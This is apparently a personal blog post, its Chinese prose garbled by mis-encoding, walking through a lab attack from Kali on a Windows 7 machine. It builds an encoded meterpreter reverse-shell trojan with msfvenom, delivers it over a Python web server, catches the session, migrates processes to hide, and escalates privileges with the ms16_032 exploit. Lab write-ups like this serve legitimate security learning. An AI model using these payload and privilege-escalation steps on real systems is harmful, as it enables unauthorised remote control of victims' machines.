---
layout:    post
title:     åæ¸—é€è·å¾—ä¸€ä¸ªæ™®é€šsession
subtitle:  å­¦ä¹ å­¦ä¹ 
date:      2021-05-28
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:

   - åæ¸—é€
---

> å®éªŒç¯å¢ƒï¼š
>
> Aï¼šKali 192.168.78.131 æ”»å‡»æœº
>
> Bï¼šwin7 192.168.78.128 å—å®³æœº

### å…ˆæ¥ä¸€ä¸ªç®€å•çš„æ‹¿ shell å§

1.åœ¨Kaliå¼€å¯ MSF

2.è¿›å…¥ç›‘å¬æ¨¡å—

```
use exploit/multi/handler
```

3.åˆ©ç”¨ msfvenom åˆ¶ä½œæœ¨é©¬ç¨‹åº

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.78.131 lport=4444 -b"\x00" -e x86/shikata_ga_nai -f exe > msf.exe
```

å‚æ•°è¯´æ˜ï¼š

+ -p payload
+ -eï¼šç¼–ç æ–¹å¼ã€‚
+ -iï¼šç¼–ç æ¬¡æ•°ã€‚
+ -bï¼šåœ¨ç”Ÿæˆçš„ç¨‹åºä¸­é¿å…å‡ºç°çš„å€¼ã€‚
+ -f exeï¼š ç”Ÿæˆ exe æ ¼å¼ã€‚

+ -aï¼šä»£è¡¨ç³»ç»Ÿç»“æ„ï¼Œéœ€è¦å’Œæ”»å‡»æœºä¸€æ ·ã€‚
+ -platformï¼šå¹³å°é€‰æ‹© Windows
+ -p windows/meterpreter/reverse_tcp åå¼¹

[![2FhEJU.png](https://z3.ax1x.com/2021/05/28/2FhEJU.png)](https://imgtu.com/i/2FhEJU)

4.å°†æœ¨é©¬ä¼ åˆ°ä¸»æœºï¼š

è¿™é‡Œä½¿ç”¨ python2ï¼š ``python -m SimpleHTTPServer port`` | python3ï¼š``python -m http.server port`` æ­å»ºä¸€ä¸ªHTTPæœåŠ¡ï¼Œæä¾›ä¸€ä¸ªæ–‡ä»¶æµè§ˆçš„webé¡µé¢åˆ°æŸç«¯å£ã€‚

[![2FhjTx.png](https://z3.ax1x.com/2021/05/28/2FhjTx.png)](https://imgtu.com/i/2FhjTx)

åœ¨è®¿é—®ä¸‹è½½æœŸé—´ä¼šæœ‰å›æ˜¾ã€‚

5.æ‰“å¼€ç›®æ ‡æœºï¼Œè¿›å…¥æ­å»ºåœ°å€ä¸‹è½½æœ¨é©¬ï¼š

[![2Fh5kV.png](https://z3.ax1x.com/2021/05/28/2Fh5kV.png)](https://imgtu.com/i/2Fh5kV)

6.è¿”å›ç¬¬äºŒæ­¥ç•Œé¢ï¼Œè®¾ç½®ç›‘å¬ä¸»æœº

```
set lhost 192.168.78.131
```

7.æŸ¥çœ‹é…ç½®

```
show options
```

[![2F4mh8.png](https://z3.ax1x.com/2021/05/28/2F4mh8.png)](https://imgtu.com/i/2F4mh8)

åœ¨è®¾ç½®ä¸€ä¸ª payloadï¼š

```
set payload windows/meterpreter/reverse_tcp
```

å†çœ‹çœ‹é€‰é¡¹ï¼š

[![2AbQR1.png](https://z3.ax1x.com/2021/05/29/2AbQR1.png)](https://imgtu.com/i/2AbQR1)

8.è¿è¡Œï¼šrun æˆ– exploit

[![2F4R3D.png](https://z3.ax1x.com/2021/05/28/2F4R3D.png)](https://imgtu.com/i/2F4R3D)

9.åœ¨ win7 ä¸­è¿è¡Œæˆ‘ä»¬çš„ msf.exe æœ¨é©¬ï¼Œå†æ¬¡æŸ¥çœ‹ msf  æ§åˆ¶å°

[![2AbYZD.png](https://z3.ax1x.com/2021/05/29/2AbYZD.png)](https://imgtu.com/i/2AbYZD)

å¯ä»¥çœ‹åˆ°å¾—åˆ°äº†sessionã€‚

10.æŸ¥çœ‹ sessionï¼Œå¦‚æœæ­¤æ—¶æ˜¯ meterpreterï¼Œè¾“å…¥ background å³å¯è¿”å› msf exploit(multi/handler)ã€‚

[![2kVIUA.png](https://z3.ax1x.com/2021/05/28/2kVIUA.png)](https://imgtu.com/i/2kVIUA)

[![2Abbo4.png](https://z3.ax1x.com/2021/05/29/2Abbo4.png)](https://imgtu.com/i/2Abbo4)

è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªæ™®é€šçš„ sessionã€‚

åœ¨ meterpreter ä¸­çœ‹çœ‹èº«ä»½ï¼š

[![2AbDQP.png](https://z3.ax1x.com/2021/05/29/2AbDQP.png)](https://imgtu.com/i/2AbDQP)

åœ¨ background è¿”å› msf ç•Œé¢åï¼Œå¯ä»¥ ``sessions`` æŸ¥çœ‹è¿›ç¨‹ï¼Œç„¶å ``session -i id`` æ¥è¿›å…¥ meterpreter ç•Œé¢ã€‚å†è¾“å…¥ ``shell`` å¯ä»¥è¿›å…¥ win7 çš„ shellã€‚

[![2AqPTe.png](https://z3.ax1x.com/2021/05/29/2AqPTe.png)](https://imgtu.com/i/2AqPTe)

å½“æˆ‘ä»¬æ‹¿åˆ° shell åæ˜¾ç¤ºä¹±ç ï¼Œå¯ä»¥ï¼š

```
chcp 65001
```

### éšè—è‡ªå·± + ææƒ

#### éšè—è‡ªå·±

å…ˆ ``ps`` æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„ä¼šè¯è¿›ç¨‹ã€‚

å†ç”¨ ``migrate 1844`` å°†è¿›ç¨‹è¿ç§»åˆ°ä¼šè¯å¯¹åº”çš„ idã€‚

(ç›®å‰ä¸æ‡‚)

#### ææƒ

è¿”å› msfï¼Œä½¿ç”¨ ``post/multi/recon/local_exploit_suggester`` æ¨¡å—ï¼ŒæŸ¥æ‰¾ç›®æ ‡æœºå™¨æœªä¿®è¡¥çš„æ¼æ´ï¼š

```
use post/multi/recon/local_exploit_suggester
```

è®¾ç½®è¦æ”»å‡»çš„ä¼šè¯ idï¼š

```
set session 1
run
```

ç»¿è‰²ä»£è¡¨å¯¹åº”çš„æ¼æ´ï¼š

[![2AXUnP.png](https://z3.ax1x.com/2021/05/29/2AXUnP.png)](https://imgtu.com/i/2AXUnP)

åˆ©ç”¨ç°æœ‰çš„æ¼æ´ææƒ (å¤åˆ¶å†’å·ä¹‹å‰çš„å°±å¯ä»¥ï¼Œå¦‚ ğŸ‘‡)

[![2AjCjI.png](https://z3.ax1x.com/2021/05/29/2AjCjI.png)](https://imgtu.com/i/2AjCjI)

```
#æœ‰çš„æ¼æ´ä¼šå¤±è´¥ï¼Œå¤šè¯•å‡ ä¸ª æˆåŠŸåä¼šè¿”å› shellï¼Œå¦åˆ™å°±æ˜¯å¤±è´¥äº†
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
show options
set session 2
run
```

[![2Ajg8H.png](https://z3.ax1x.com/2021/05/29/2Ajg8H.png)](https://imgtu.com/i/2Ajg8H)

å†æ¬¡æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™ï¼Œå¯ä»¥çœ‹åˆ°ææƒæˆåŠŸã€‚

ææƒè¯¦æƒ… ------> [here](https://lll-yz.github.io/2021/05/28/å†…ç½‘æ¸—é€ä¹‹ææƒ/)